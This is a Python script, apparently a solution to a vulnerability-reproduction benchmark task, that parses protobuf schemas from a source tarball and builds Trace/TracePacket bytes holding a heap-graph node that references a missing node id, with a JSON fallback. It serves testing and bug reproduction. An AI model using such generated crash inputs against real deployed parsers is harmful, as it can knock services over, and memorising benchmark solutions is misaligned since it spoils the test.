import os
import re
import tarfile
import tempfile
import shutil
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Any, Set


SCALAR_TYPES = {
    "double", "float",
    "int32", "int64", "uint32", "uint64",
    "sint32", "sint64",
    "fixed32", "fixed64",
    "sfixed32", "sfixed64",
    "bool", "string", "bytes",
}


def _encode_varint(n: int) -> bytes:
    if n < 0:
        n &= (1 << 64) - 1
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _zigzag32(n: int) -> int:
    return (n << 1) ^ (n >> 31)


def _zigzag64(n: int) -> int:
    return (n << 1) ^ (n >> 63)


def _encode_key(field_number: int, wire_type: int) -> bytes:
    return _encode_varint((field_number << 3) | wire_type)


def _encode_len_delim(data: bytes) -> bytes:
    return _encode_varint(len(data)) + data


@dataclass
class FieldDef:
    label: str  # optional/repeated/required/oneof
    type_name: str
    name: str
    number: int


@dataclass
class MessageDef:
    full_name: str
    fields: List[FieldDef]


class ProtoSchema:
    def __init__(self):
        self.package: str = ""
        self.messages: Dict[str, MessageDef] = {}
        self.simple_index: Dict[str, List[str]] = {}

    def add_message(self, msg: MessageDef) -> None:
        self.messages[msg.full_name] = msg
        simple = msg.full_name.split(".")[-1]
        self.simple_index.setdefault(simple, []).append(msg.full_name)

    def resolve_message(self, type_name: str) -> Optional[str]:
        t = type_name.strip()
        if t.startswith("."):
            t = t[1:]
        if t in self.messages:
            return t
        simple = t.split(".")[-1]
        cands = self.simple_index.get(simple)
        if not cands:
            return None
        if len(cands) == 1:
            return cands[0]
        if self.package:
            pkg = self.package + "."
            for c in cands:
                if c.startswith(pkg):
                    return c
        return cands[0]

    def find_by_simple(self, simple: str) -> Optional[str]:
        cands = self.simple_index.get(simple)
        if not cands:
            return None
        if len(cands) == 1:
            return cands[0]
        if self.package:
            pkg = self.package + "."
            for c in cands:
                if c.startswith(pkg):
                    return c
        return cands[0]

    @staticmethod
    def _strip_comments(text: str) -> str:
        text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
        text = re.sub(r"//[^\n]*", "", text)
        return text

    @staticmethod
    def _find_matching_brace(text: str, open_idx: int) -> int:
        depth = 0
        i = open_idx
        n = len(text)
        while i < n:
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return i
            i += 1
        return -1

    @staticmethod
    def _extract_message_blocks(text: str, prefix: str = "") -> List[Tuple[str, str]]:
        blocks: List[Tuple[str, str]] = []
        i = 0
        n = len(text)
        msg_re = re.compile(r"\bmessage\s+([A-Za-z_]\w*)\s*\{")
        while i < n:
            m = msg_re.search(text, i)
            if not m:
                break
            name = m.group(1)
            brace_open = text.find("{", m.end() - 1)
            if brace_open < 0:
                i = m.end()
                continue
            brace_close = ProtoSchema._find_matching_brace(text, brace_open)
            if brace_close < 0:
                i = m.end()
                continue
            body = text[brace_open + 1:brace_close]
            full = f"{prefix}.{name}" if prefix else name
            blocks.append((full, body))
            blocks.extend(ProtoSchema._extract_message_blocks(body, full))
            i = brace_close + 1
        return blocks

    @staticmethod
    def _parse_fields_from_body(body: str) -> List[FieldDef]:
        fields: List[FieldDef] = []

        def parse_statement(stmt: str, label_override: Optional[str] = None) -> None:
            s = " ".join(stmt.strip().split())
            if not s:
                return
            if s.startswith(("reserved ", "option ", "extensions ", "extend ", "enum ", "message ", "service ", "import ", "package ", "syntax ")):
                return
            if s.startswith("map<"):
                m = re.match(r"map<[^>]+>\s+([A-Za-z_]\w*)\s*=\s*(\d+)", s)
                if m:
                    name = m.group(1)
                    num = int(m.group(2))
                    fields.append(FieldDef(label_override or "optional", "map", name, num))
                return

            m = re.match(r"(?:(optional|required|repeated)\s+)?([.\w]+)\s+([A-Za-z_]\w*)\s*=\s*(\d+)\b", s)
            if not m:
                return
            label = m.group(1) or (label_override or "optional")
            type_name = m.group(2)
            name = m.group(3)
            num = int(m.group(4))
            fields.append(FieldDef(label, type_name, name, num))

        # depth-0 statements
        buf = []
        depth = 0
        i = 0
        n = len(body)
        while i < n:
            c = body[i]
            if c == "{":
                depth += 1
                buf.append(c)
                i += 1
                continue
            if c == "}":
                depth -= 1
                buf.append(c)
                i += 1
                continue
            if c == ";" and depth == 0:
                stmt = "".join(buf)
                buf.clear()
                parse_statement(stmt)
                i += 1
                continue
            buf.append(c)
            i += 1

        # parse oneof blocks for fields too
        oneof_re = re.compile(r"\boneof\s+([A-Za-z_]\w*)\s*\{")
        i = 0
        while True:
            m = oneof_re.search(body, i)
            if not m:
                break
            brace_open = body.find("{", m.end() - 1)
            if brace_open < 0:
                i = m.end()
                continue
            brace_close = ProtoSchema._find_matching_brace(body, brace_open)
            if brace_close < 0:
                i = m.end()
                continue
            oneof_body = body[brace_open + 1:brace_close]
            for stmt in oneof_body.split(";"):
                parse_statement(stmt, label_override="oneof")
            i = brace_close + 1

        return fields

    @classmethod
    def from_dir(cls, root: str) -> "ProtoSchema":
        schema = cls()
        proto_paths: List[str] = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn.endswith(".proto"):
                    proto_paths.append(os.path.join(dirpath, fn))

        # parse package from a likely root proto if present
        for p in sorted(proto_paths):
            try:
                with open(p, "rb") as f:
                    data = f.read(2_000_000)
            except Exception:
                continue
            txt = data.decode("utf-8", errors="ignore")
            txt = cls._strip_comments(txt)
            pm = re.search(r"\bpackage\s+([A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*)\s*;", txt)
            if pm:
                schema.package = pm.group(1)
                break

        for p in proto_paths:
            try:
                with open(p, "rb") as f:
                    data = f.read(5_000_000)
            except Exception:
                continue
            txt = data.decode("utf-8", errors="ignore")
            txt = cls._strip_comments(txt)
            pkg = schema.package
            pm = re.search(r"\bpackage\s+([A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*)\s*;", txt)
            if pm:
                pkg = pm.group(1)

            blocks = cls._extract_message_blocks(txt, prefix=pkg if pkg else "")
            for full_name, body in blocks:
                if not full_name:
                    continue
                if full_name in schema.messages:
                    continue
                fields = cls._parse_fields_from_body(body)
                schema.add_message(MessageDef(full_name, fields))
        return schema


def _iter_source_files(root: str) -> List[str]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc"}
    out = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            _, ext = os.path.splitext(fn)
            if ext.lower() in exts:
                out.append(os.path.join(dirpath, fn))
    return out


def _read_text(path: str, limit: int = 2_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _find_clue_message_names(root: str) -> Set[str]:
    clues: Set[str] = set()
    for p in _iter_source_files(root):
        txt = _read_text(p, 2_000_000)
        if "node_id_map" not in txt:
            continue
        for m in re.finditer(r"\bpbzero::([A-Za-z_]\w*)::Decoder\b", txt):
            clues.add(m.group(1))
        for m in re.finditer(r"\bprotos::pbzero::([A-Za-z_]\w*)::Decoder\b", txt):
            clues.add(m.group(1))
        for m in re.finditer(r"\b([A-Za-z_]\w*)::Decoder\b", txt):
            name = m.group(1)
            if "Heap" in name or "Snapshot" in name or "Graph" in name:
                clues.add(name)
    return clues


def _detect_root_preference(root: str) -> str:
    # returns "Trace", "TracePacket", or ""
    score_trace = 0
    score_packet = 0
    for p in _iter_source_files(root):
        txt = _read_text(p, 1_000_000)
        if not txt:
            continue
        if "Trace::Decoder" in txt or "pbzero::Trace::Decoder" in txt:
            score_trace += 2
        if "TracePacket::Decoder" in txt or "pbzero::TracePacket::Decoder" in txt:
            score_packet += 2
        if "ParseTrace" in txt or "TraceProcessor" in txt:
            score_trace += 1
        if "LLVMFuzzerTestOneInput" in txt:
            if "TracePacket::Decoder" in txt:
                score_packet += 3
            if "Trace::Decoder" in txt:
                score_trace += 3
    if score_trace > score_packet and score_trace > 0:
        return "Trace"
    if score_packet > score_trace and score_packet > 0:
        return "TracePacket"
    return ""


def _message_score(schema: ProtoSchema, msg_full: str) -> int:
    md = schema.messages.get(msg_full)
    if not md:
        return -10
    name = msg_full.split(".")[-1].lower()
    score = 0
    if "heap" in name:
        score += 6
    if "snapshot" in name:
        score += 5
    if "graph" in name:
        score += 4
    if "profile" in name:
        score += 2
    if "dump" in name:
        score += 1

    rep_msg_fields = 0
    node_like = 0
    edge_like = 0
    for f in md.fields:
        t_full = schema.resolve_message(f.type_name)
        if f.label == "repeated" and t_full:
            rep_msg_fields += 1
            fn = f.name.lower()
            tn = t_full.split(".")[-1].lower()
            if "node" in fn or "object" in fn or "node" in tn or "object" in tn:
                node_like += 1
            if "edge" in fn or "ref" in fn or "edge" in tn or "ref" in tn:
                edge_like += 1
    score += rep_msg_fields
    score += node_like * 4
    score += edge_like * 3
    return score


def _choose_best_target_message(schema: ProtoSchema, prefer_simples: Set[str]) -> Optional[str]:
    # Prefer any clue-derived messages if they exist
    for simple in list(prefer_simples):
        full = schema.find_by_simple(simple)
        if full:
            return full

    best = None
    best_score = -10**9
    for msg_full in schema.messages.keys():
        s = _message_score(schema, msg_full)
        if s > best_score:
            best_score = s
            best = msg_full
    if best_score <= 0:
        return None
    return best


def _build_graph(schema: ProtoSchema) -> Dict[str, List[Tuple[str, str]]]:
    # msg -> [(field_name, child_msg)]
    g: Dict[str, List[Tuple[str, str]]] = {}
    for mfull, md in schema.messages.items():
        adj = []
        for f in md.fields:
            child = schema.resolve_message(f.type_name)
            if child and child in schema.messages:
                adj.append((f.name, child))
        g[mfull] = adj
    return g


def _find_path(schema: ProtoSchema, start: str, target: str, max_depth: int = 6) -> Optional[List[Tuple[str, str, str]]]:
    if start == target:
        return []
    g = _build_graph(schema)
    from collections import deque
    q = deque()
    q.append(start)
    prev: Dict[str, Tuple[str, str]] = {}  # node -> (parent, via_field)
    depth: Dict[str, int] = {start: 0}
    while q:
        cur = q.popleft()
        d = depth[cur]
        if d >= max_depth:
            continue
        for fname, nxt in g.get(cur, []):
            if nxt in depth:
                continue
            depth[nxt] = d + 1
            prev[nxt] = (cur, fname)
            if nxt == target:
                q.clear()
                break
            q.append(nxt)
    if target not in depth:
        return None
    # reconstruct
    path_rev: List[Tuple[str, str, str]] = []
    cur = target
    while cur != start:
        parent, fname = prev[cur]
        path_rev.append((parent, fname, cur))
        cur = parent
    path_rev.reverse()
    return path_rev


def _choose_field(md: MessageDef, predicate) -> Optional[FieldDef]:
    for f in md.fields:
        if predicate(f):
            return f
    return None


def _choose_fields(md: MessageDef, predicate) -> List[FieldDef]:
    return [f for f in md.fields if predicate(f)]


def _is_scalar_type(t: str) -> bool:
    t = t.strip()
    if t.startswith("."):
        t = t[1:]
    t = t.split(".")[-1]
    return t in SCALAR_TYPES


def _encode_scalar(type_name: str, value: Any) -> bytes:
    t = type_name.strip()
    if t.startswith("."):
        t = t[1:]
    t = t.split(".")[-1]
    if t in ("int32", "int64", "uint32", "uint64", "bool", "enum"):
        v = int(value)
        return _encode_varint(v)
    if t == "sint32":
        v = int(value)
        return _encode_varint(_zigzag32(v))
    if t == "sint64":
        v = int(value)
        return _encode_varint(_zigzag64(v))
    if t in ("fixed32", "sfixed32", "float"):
        v = int(value) & 0xFFFFFFFF
        return v.to_bytes(4, "little", signed=False)
    if t in ("fixed64", "sfixed64", "double"):
        v = int(value) & 0xFFFFFFFFFFFFFFFF
        return v.to_bytes(8, "little", signed=False)
    if t == "string":
        if isinstance(value, bytes):
            b = value
        else:
            b = str(value).encode("utf-8", errors="ignore")
        return _encode_len_delim(b)
    if t == "bytes":
        b = value if isinstance(value, (bytes, bytearray)) else bytes(value)
        return _encode_len_delim(bytes(b))
    # default to varint
    return _encode_varint(int(value))


def _wire_type_for(type_name: str, is_message: bool) -> int:
    if is_message:
        return 2
    t = type_name.strip()
    if t.startswith("."):
        t = t[1:]
    t = t.split(".")[-1]
    if t in ("fixed64", "sfixed64", "double"):
        return 1
    if t in ("fixed32", "sfixed32", "float"):
        return 5
    if t in ("string", "bytes"):
        return 2
    return 0


def _encode_message(schema: ProtoSchema, msg_full: str, values: Dict[str, Any]) -> bytes:
    md = schema.messages.get(msg_full)
    if not md:
        return b""
    out = bytearray()
    for f in md.fields:
        if f.name not in values:
            continue
        v = values[f.name]
        if v is None:
            continue

        child_full = schema.resolve_message(f.type_name)
        is_msg = child_full is not None and child_full in schema.messages

        def emit_one(one_v: Any) -> None:
            if is_msg:
                if isinstance(one_v, dict):
                    payload = _encode_message(schema, child_full, one_v)
                else:
                    payload = bytes(one_v)
                out.extend(_encode_key(f.number, 2))
                out.extend(_encode_len_delim(payload))
            else:
                wire = _wire_type_for(f.type_name, False)
                out.extend(_encode_key(f.number, wire))
                out.extend(_encode_scalar(f.type_name, one_v))

        if f.label == "repeated":
            if isinstance(v, list):
                for one in v:
                    emit_one(one)
            else:
                emit_one(v)
        else:
            emit_one(v)
    return bytes(out)


def _fill_common_scalars(md: MessageDef) -> Dict[str, int]:
    vals: Dict[str, int] = {}
    for f in md.fields:
        if not _is_scalar_type(f.type_name):
            continue
        nm = f.name.lower()
        if nm in ("pid", "tgid", "process_id", "processid", "upid", "client_pid", "writer_pid"):
            vals[f.name] = 1
        elif nm in ("tid", "thread_id", "utid"):
            vals[f.name] = 1
        elif "timestamp" in nm or nm in ("ts", "time_ns", "time", "start_timestamp", "end_timestamp", "event_time_ns"):
            vals[f.name] = 1
        elif nm in ("sequence_id", "trusted_packet_sequence_id", "seq_id", "seqid"):
            vals[f.name] = 1
    return vals


def _choose_id_field(md: MessageDef) -> Optional[FieldDef]:
    scalar_fields = [f for f in md.fields if _is_scalar_type(f.type_name)]
    exact = [f for f in scalar_fields if f.name == "id"]
    if exact:
        return exact[0]
    for nm in ("object_id", "node_id", "heap_object_id", "graph_node_id", "uid", "iid"):
        for f in scalar_fields:
            if f.name.lower() == nm:
                return f
    for f in scalar_fields:
        if f.name.lower().endswith("_id") and "type" not in f.name.lower():
            return f
    for f in scalar_fields:
        if "id" in f.name.lower() and "type" not in f.name.lower():
            return f
    return scalar_fields[0] if scalar_fields else None


def _choose_ref_field(md: MessageDef, schema: ProtoSchema) -> Optional[FieldDef]:
    # prefer repeated fields related to refs/edges
    def is_candidate(f: FieldDef) -> bool:
        nm = f.name.lower()
        if f.label != "repeated":
            return False
        if any(k in nm for k in ("ref", "edge", "child", "children", "out", "target", "to", "reference")):
            return True
        t = f.type_name.split(".")[-1].lower()
        if any(k in t for k in ("ref", "edge", "reference")):
            return True
        return False

    cands = [f for f in md.fields if is_candidate(f)]
    if cands:
        # prefer scalar first
        for f in cands:
            if _is_scalar_type(f.type_name):
                return f
        return cands[0]

    # fallback: any repeated scalar field ending with _id
    for f in md.fields:
        if f.label == "repeated" and _is_scalar_type(f.type_name):
            if "id" in f.name.lower():
                return f
    return None


def _choose_nodes_field(md: MessageDef, schema: ProtoSchema) -> Optional[FieldDef]:
    rep_msg = [f for f in md.fields if f.label == "repeated" and schema.resolve_message(f.type_name) in schema.messages]
    def score(f: FieldDef) -> int:
        nm = f.name.lower()
        tn = (schema.resolve_message(f.type_name) or f.type_name).split(".")[-1].lower()
        s = 0
        if "node" in nm or "node" in tn:
            s += 6
        if "object" in nm or "object" in tn:
            s += 5
        if "entry" in nm or "item" in nm:
            s += 1
        if "type" in nm:
            s -= 2
        if "edge" in nm or "ref" in nm:
            s -= 1
        return s
    if not rep_msg:
        return None
    rep_msg.sort(key=score, reverse=True)
    return rep_msg[0]


def _choose_edges_field(md: MessageDef, schema: ProtoSchema) -> Optional[FieldDef]:
    rep_msg = [f for f in md.fields if f.label == "repeated" and schema.resolve_message(f.type_name) in schema.messages]
    def score(f: FieldDef) -> int:
        nm = f.name.lower()
        tn = (schema.resolve_message(f.type_name) or f.type_name).split(".")[-1].lower()
        s = 0
        if "edge" in nm or "edge" in tn:
            s += 6
        if "ref" in nm or "ref" in tn or "reference" in nm or "reference" in tn:
            s += 5
        if "link" in nm:
            s += 2
        if "node" in nm or "object" in nm:
            s -= 1
        return s
    if not rep_msg:
        return None
    rep_msg.sort(key=score, reverse=True)
    best = rep_msg[0]
    if score(best) <= 0:
        return None
    return best


def _choose_edge_endpoints(edge_md: MessageDef) -> Tuple[Optional[FieldDef], Optional[FieldDef]]:
    scalar = [f for f in edge_md.fields if _is_scalar_type(f.type_name)]
    if not scalar:
        return None, None

    def find_any(keys: List[str], prefer_suffix: bool = False) -> Optional[FieldDef]:
        for k in keys:
            for f in scalar:
                nm = f.name.lower()
                if prefer_suffix:
                    if nm.endswith(k):
                        return f
                else:
                    if k in nm:
                        return f
        return None

    src = find_any(["source", "src", "from", "owner", "origin", "parent"], prefer_suffix=False)
    dst = find_any(["target", "dst", "to", "child", "ref", "reference"], prefer_suffix=False)

    if not src:
        src = find_any(["_id", "id"], prefer_suffix=True)
    if not dst:
        dst = find_any(["_id", "id"], prefer_suffix=True)

    if src and dst and src.name == dst.name:
        # try alternate
        for f in scalar:
            if f.name != src.name:
                dst = f
                break
    return src, dst


def _make_target_payload(schema: ProtoSchema, target_full: str) -> Dict[str, Any]:
    md = schema.messages.get(target_full)
    if not md:
        return {}
    payload: Dict[str, Any] = {}
    payload.update(_fill_common_scalars(md))

    nodes_field = _choose_nodes_field(md, schema)
    edges_field = _choose_edges_field(md, schema)

    # Build node with missing reference
    if nodes_field:
        node_full = schema.resolve_message(nodes_field.type_name)
        node_md = schema.messages.get(node_full) if node_full else None
        if node_md:
            node_obj: Dict[str, Any] = {}
            node_obj.update(_fill_common_scalars(node_md))
            id_field = _choose_id_field(node_md)
            if id_field:
                node_obj[id_field.name] = 1

            ref_field = _choose_ref_field(node_md, schema)
            if ref_field:
                if _is_scalar_type(ref_field.type_name):
                    node_obj[ref_field.name] = [2]
                else:
                    ref_full = schema.resolve_message(ref_field.type_name)
                    ref_md = schema.messages.get(ref_full) if ref_full else None
                    if ref_md:
                        ref_obj: Dict[str, Any] = {}
                        ref_obj.update(_fill_common_scalars(ref_md))
                        rid = _choose_id_field(ref_md)
                        if rid:
                            ref_obj[rid.name] = 2
                        else:
                            # try target-like scalar fields
                            for f in ref_md.fields:
                                if _is_scalar_type(f.type_name) and any(k in f.name.lower() for k in ("to", "target", "ref", "id")):
                                    ref_obj[f.name] = 2
                                    break
                        node_obj[ref_field.name] = [ref_obj]
            payload[nodes_field.name] = [node_obj]

    # Also add explicit edge if possible (in case refs aren't per-node)
    if edges_field:
        edge_full = schema.resolve_message(edges_field.type_name)
        edge_md = schema.messages.get(edge_full) if edge_full else None
        if edge_md:
            edge_obj: Dict[str, Any] = {}
            edge_obj.update(_fill_common_scalars(edge_md))
            src_f, dst_f = _choose_edge_endpoints(edge_md)
            if src_f:
                edge_obj[src_f.name] = 1
            if dst_f:
                edge_obj[dst_f.name] = 2
            if edge_obj:
                payload[edges_field.name] = [edge_obj]

    # If no nodes/edges found, try best-effort: set any id-like field and any repeated id-like field
    if not payload:
        payload.update(_fill_common_scalars(md))
    return payload


def _make_wrapped_packet(schema: ProtoSchema, packet_full: str, target_full: str, prefer_path_from_packet: Optional[List[Tuple[str, str, str]]] = None) -> Dict[str, Any]:
    packet_md = schema.messages.get(packet_full)
    if not packet_md:
        return {}

    target_payload = _make_target_payload(schema, target_full)

    # determine a path packet -> ... -> target
    path = prefer_path_from_packet
    if path is None:
        path = _find_path(schema, packet_full, target_full, max_depth=6)
    if path is None:
        # maybe target is directly packet_full
        if packet_full == target_full:
            pkt_values = {}
            pkt_values.update(_fill_common_scalars(packet_md))
            pkt_values.update(target_payload)
            return pkt_values
        # fall back: try to inject into any field whose type matches target simple name
        target_simple = target_full.split(".")[-1]
        for f in packet_md.fields:
            child = schema.resolve_message(f.type_name)
            if child and child.split(".")[-1] == target_simple:
                pkt_values = {}
                pkt_values.update(_fill_common_scalars(packet_md))
                pkt_values[f.name] = target_payload
                return pkt_values
        return {}

    # Build nested dict following path
    cur_payload: Dict[str, Any] = target_payload
    for parent_full, fname, child_full in reversed(path):
        parent_md = schema.messages.get(parent_full)
        if not parent_md:
            continue
        wrapper: Dict[str, Any] = {}
        wrapper.update(_fill_common_scalars(parent_md))
        wrapper[fname] = cur_payload
        cur_payload = wrapper

    # cur_payload now corresponds to packet_full values
    if packet_full != path[0][0]:
        # unexpected, but merge
        pkt_values = {}
        pkt_values.update(_fill_common_scalars(packet_md))
        pkt_values.update(cur_payload)
        return pkt_values

    pkt_values = {}
    pkt_values.update(_fill_common_scalars(packet_md))
    pkt_values.update(cur_payload)
    return pkt_values


def _find_packet_field_in_trace(schema: ProtoSchema, trace_full: str, packet_full: str) -> Optional[FieldDef]:
    md = schema.messages.get(trace_full)
    if not md:
        return None
    # prefer repeated field named packet
    for f in md.fields:
        if f.label == "repeated" and f.name.lower() == "packet":
            child = schema.resolve_message(f.type_name)
            if child == packet_full:
                return f
    # any repeated message of type TracePacket
    for f in md.fields:
        if f.label == "repeated":
            child = schema.resolve_message(f.type_name)
            if child == packet_full:
                return f
    # any field named packet
    for f in md.fields:
        if f.name.lower() == "packet":
            child = schema.resolve_message(f.type_name)
            if child == packet_full:
                return f
    return None


def _make_trace_bytes(schema: ProtoSchema, trace_full: str, packet_full: str, packet_bytes: bytes) -> Optional[bytes]:
    md = schema.messages.get(trace_full)
    if not md:
        return None
    packet_field = _find_packet_field_in_trace(schema, trace_full, packet_full)
    if not packet_field:
        return None
    # encode trace as: repeated packet = packet_bytes
    out = bytearray()
    out.extend(_encode_key(packet_field.number, 2))
    out.extend(_encode_len_delim(packet_bytes))
    return bytes(out)


def _make_json_fallback(root: str) -> bytes:
    # Heuristic: attempt to infer key strings from relevant source file
    keys = set()
    for p in _iter_source_files(root):
        txt = _read_text(p, 500_000)
        if "node_id_map" not in txt:
            continue
        for m in re.finditer(r'\["([A-Za-z_]\w*)"\]', txt):
            keys.add(m.group(1))
        for m in re.finditer(r"get\(\s*\)\s*;.*?\b([A-Za-z_]\w*)\b", txt):
            pass

    # Use common keys; add inferred ones as extras
    payload = {
        "nodes": [
            {
                "id": 1,
                "node_id": 1,
                "object_id": 1,
                "refs": [2],
                "ref_ids": [2],
                "references": [{"id": 2}, {"node_id": 2}, {"to": 2}, {"target": 2}],
                "edges": [{"to": 2}, {"target": 2}],
            }
        ],
        "edges": [{"from": 1, "to": 2}, {"src": 1, "dst": 2}, {"source": 1, "target": 2}],
        "pid": 1,
        "timestamp": 1,
        "version": 1,
    }
    # sprinkle inferred keys at top-level, harmless
    for k in list(keys)[:20]:
        if k not in payload:
            payload[k] = 1

    import json
    return json.dumps(payload, separators=(",", ":")).encode("utf-8")


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)

            # pick likely root directory
            entries = [os.path.join(tmpdir, x) for x in os.listdir(tmpdir)]
            dirs = [d for d in entries if os.path.isdir(d)]
            root = tmpdir
            if len(dirs) == 1:
                root = dirs[0]

            schema = ProtoSchema.from_dir(root)
            if not schema.messages:
                return _make_json_fallback(root)

            clues = _find_clue_message_names(root)
            target_full = _choose_best_target_message(schema, clues)
            if not target_full:
                return _make_json_fallback(root)

            trace_full = schema.find_by_simple("Trace")
            packet_full = schema.find_by_simple("TracePacket")

            root_pref = _detect_root_preference(root)

            # If no TracePacket, try to find any "*Packet" message
            if not packet_full:
                for simple, fulls in schema.simple_index.items():
                    if simple.endswith("Packet"):
                        packet_full = fulls[0]
                        break

            # Create packet bytes if possible (either TracePacket or target itself)
            packet_bytes = b""
            if packet_full:
                packet_values = _make_wrapped_packet(schema, packet_full, target_full)
                packet_bytes = _encode_message(schema, packet_full, packet_values)
            else:
                # no packet wrapper; use target message directly
                packet_bytes = _encode_message(schema, target_full, _make_target_payload(schema, target_full))

            # Create trace bytes if possible
            trace_bytes = None
            if trace_full and packet_full and packet_bytes:
                trace_bytes = _make_trace_bytes(schema, trace_full, packet_full, packet_bytes)

            # Robust polyglot between Trace and TracePacket:
            # return (Trace(packet=...)) + (raw TracePacket) to satisfy either root parser.
            if trace_bytes and packet_bytes:
                if root_pref == "TracePacket":
                    return trace_bytes + packet_bytes
                if root_pref == "Trace":
                    return trace_bytes + packet_bytes
                # unknown: still return combined
                return trace_bytes + packet_bytes

            if root_pref == "TracePacket" and packet_bytes:
                return packet_bytes

            if trace_bytes:
                return trace_bytes

            if packet_bytes:
                return packet_bytes

            return _make_json_fallback(root)
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)